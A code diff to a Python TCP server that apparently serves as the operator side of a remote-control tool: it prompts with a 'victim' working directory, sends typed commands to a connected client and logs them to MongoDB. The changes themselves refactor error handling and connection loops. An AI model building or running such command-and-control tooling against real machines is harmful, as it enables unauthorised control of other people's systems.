@@ -6,6 +6,9 @@ import time
 import signal
 from sys import exit
 
+errors_might_happen = (pymongo.errors.ServerSelectionTimeoutError, socket.error, Exception, BrokenPipeError)
+signal.signal(signal.SIGINT, signal.SIG_DFL)
+
 
 class ServerTcp:
 
@@ -17,13 +20,10 @@ class ServerTcp:
             self.mycol = self.mydb[collection_name]
 
             self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            signal.signal(signal.SIGINT, signal.SIG_DFL)
 
-            self.ip = ip_server
-            self.port = port
-            self.s.bind((self.ip, self.port))
+            self.s.bind((ip_server, port))
 
-        except (socket.error, Exception) as e:
+        except errors_might_happen as e:
             print("Error in connection", e)
             return
 
@@ -32,11 +32,11 @@ class ServerTcp:
         self.start_conn()
 
     def test_connection(self):
-        while True:
+        while self.connection:
             time.sleep(2)
             try:
                 self.client_socket.send("CHECKING CONNECTION".encode())
-            except socket.error:
+            except errors_might_happen:
                 self.connection = False
 
     def start_conn(self):
@@ -46,6 +46,7 @@ class ServerTcp:
         self.client_socket, self.address = self.s.accept()
         print("client address : ", self.address)
 
+        self.connection = True
         self.test_conn = threading.Thread(target=self.test_connection)
         self.test_conn.daemon = True
         self.test_conn.start()
@@ -62,7 +63,10 @@ class ServerTcp:
                 swap = get_victim_pwd
             else:
                 get_victim_pwd = swap
-            msg = input(f"{get_victim_pwd} > ").strip()
+            while self.connection:
+                msg = input(f"{get_victim_pwd} > ").strip()
+                if msg:
+                    break
             if msg in ['exit', 'get_op', 'get_last']:
                 get_victim_pwd = False
             if msg == 'exit':  # Close the server
@@ -80,11 +84,9 @@ class ServerTcp:
                     self.mycol.insert_one({"data": msg, 'sender': 'SERVER'})
                     print("\n[[sent]]\n")
 
-                except (socket.error, Exception):
-                    print("Client Has Closed The Connection ..")
+                except errors_might_happen as e:
+                    print("Connection is Closed : ", e)
                     self.start_conn()
-
-        return
 
 
 while True:
